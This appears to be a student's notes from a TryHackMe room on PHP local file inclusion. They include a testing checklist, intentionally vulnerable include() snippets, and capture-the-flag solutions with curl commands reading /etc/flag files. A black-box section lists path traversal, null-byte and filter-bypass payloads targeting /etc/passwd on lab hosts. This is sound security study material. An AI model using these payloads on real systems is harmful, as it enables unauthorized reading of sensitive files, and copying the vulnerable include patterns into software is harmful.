With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications.
#### Steps for Testing for LFI
1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!  
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files

#### THM Challenges
1. Capture the flag1 at /etc/flag1 by changing the form method to `POST` in the page source or use a tool like Burp to modify the method of the request POST.
	```bash
	curl -X POST http://IP/challenges/chall1.php? -d "file=/etc/flag1"
	```

2. Capture the flag2 at /etc/flag2 by `cookies`
	- In Browser:
		- `change the cookie value to admin`
	- If successful:
		- `change the cookie value to /etc/flag2`
	- Server adds `/` and `.php`, so remove them from the cookie
		- `change the cookie value to etc/flag2%00`
	- Perform the Directory Traversal:
		- `../../../../etc/flag2%00`

3. Capture the flag3 at /etc/flag3, the website uses the `$_REQUESTS` to accept HTTP requests.
	- In Browser:
		- `/etc/flag3`
	- filters `/`, `3`, and there is the `.php` extension. 
		- `....//....//....//....//etc/flag%33%00` --> didn't work in the browser
	- seems like there's a filtering for the ***GET*** request. So, use CURL and change the GET to ***POST***
		- `curl -X POST http://IP/challenges/chall3.php -d 'file=../../../../etc/flag%33%00' --output -

**Example 1:**
Suppose the web application provides two languages, and the user can select between the `EN` and `AR`, an attacker can exploit this to load sensitive file like `/etc/passwd` by modifying the URL.

Instead of loading `hxxp://webapp.thm/index.php?lang=EN.php or hxxp://webapp.thm/index.php?lang=AR.php` to select a language, we can try `http://webapp.thm/get.php?file=/etc/passwd`
```php
<?PHP 
	include($_GET["lang"]);
?>
```

**Example 2:**
In the following code, the developer decided to specify the ***directory inside the function***.
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
	In the above code, the developer used the include function to call PHP pages in the languages directory only via lang parameters.
	
	The following will be the exploit: `hxxp://webapp.thm/index.php?lang=../../../../etc/passwd`

### Black Box Testing
We have to identify vulnerabilities without access to source code by observing error messages. When invalid inputs reveal file paths or functions, attackers can exploit them to access sensitive files.
##### Techniques & Examples:
1. **Path Traversal (Directory Escape):**
    - **Example:**        
        ```
        http://webapp.thm/index.php?lang=../../../../etc/passwd
        ```
        - Escapes the `languages/` directory to access sensitive files.
        
2. **Null Byte Injection:**
    - **Example:**        
        ```
        http://webapp.thm/index.php?lang=../../../../../etc/passwd%00
        ```
        - Bypasses the `.php` extension by terminating the string early with `%00`.
        - _Note:_ Doesn't work on PHP 5.3.4 and above.
        
3. **Current Directory Trick:**
    
    - **Example:**
        ```
        http://webapp.thm/index.php?lang=/etc/passwd/
        ```
        - Bypasses filters by staying in the current directory.
        
4. **Bypassing Filters (PHP Substring Replacement):**
    
    - **Example:**
	    ```
	    http://webapp.thm/index.php?lang=....//....//....//etc/passwd
	    ```
        - PHP replaces the first `../` but misses others, allowing access to files.
        
5. **Forced Directory Inclusion:**
    - **Example:**
        ```
        http://webapp.thm/index.php?lang=languages/../../../../etc/passwd
        ```
        - Exploits input restrictions by including the directory in the payload.

These techniques highlight how error messages and poor input validation can expose critical vulnerabilities in web applications.

